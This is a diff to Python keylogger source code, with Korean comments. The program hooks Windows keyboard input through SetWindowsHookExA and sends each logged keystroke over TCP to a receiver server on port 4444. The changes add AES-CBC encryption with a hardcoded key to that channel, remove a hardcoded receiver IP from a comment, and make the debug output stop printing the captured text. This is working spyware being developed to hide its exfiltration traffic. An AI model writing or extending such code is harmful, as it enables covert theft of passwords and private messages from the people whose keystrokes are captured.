@@ -6,6 +6,8 @@ import sys
 from ctypes import windll, CFUNCTYPE, POINTER, c_void_p, c_int, Structure
 from ctypes.wintypes import DWORD, HWND, LPARAM, WPARAM, HHOOK
 
+from Crypto.Cipher import AES
+
 # ==================== 설정 ====================
 SERVER_IP = "127.0.0.1"
 SERVER_PORT = 4444
@@ -31,6 +33,24 @@ user32.SetWindowsHookExA.argtypes = [c_int, CFUNCTYPE(c_int, c_int, WPARAM, LPAR
 user32.SetWindowsHookExA.restype = HHOOK
 user32.CallNextHookEx.argtypes = [HHOOK, c_int, WPARAM, c_void_p]
 user32.CallNextHookEx.restype = c_int
+
+
+key = b"sixteen byte key"
+
+# Encrypted channel 구성을 위한 암호화 함수
+def encrypt_msg(msg):
+    data = msg.encode('utf-8')
+    iv = os.urandom(16)
+    
+    # padding
+    pad_len = 16 - (len(data)%16)
+    padding = bytes([pad_len]*pad_len)
+    padded_data = data + padding
+    
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    encrypted = cipher.encrypt(padded_data)
+    
+    return iv + encrypted
 
 
 class KBDLLHOOKSTRUCT(Structure):
@@ -110,7 +130,7 @@ def get_key_name(vk):
 
 def connect_to_server():
     """
-    Receiver(192.168.0.3)와 TCP 연결을 시도하는 함수
+    Receiver와 TCP 연결을 시도하는 함수
     - 연결 실패 시 3초 간격으로 재시도
     - 연결 성공 시 connected 플래그를 True로 설정
     """
@@ -143,8 +163,9 @@ def send_log(msg):
 
     try:
         full_msg = f"{msg}\n"
-        sock.sendall(full_msg.encode('utf-8', errors='ignore'))
-        print(f"[DEBUG] Sent to server: {msg}")   # ← 성공 시 출력
+        encrypted = encrypt_msg(full_msg)
+        sock.sendall(encrypted)
+        print(f"[DEBUG] Sent encrypted: {len(encrypted)} bytes")   # ← 성공 시 출력
     except Exception as e:
         print(f"[DEBUG] Send failed: {e}")
         connected = False
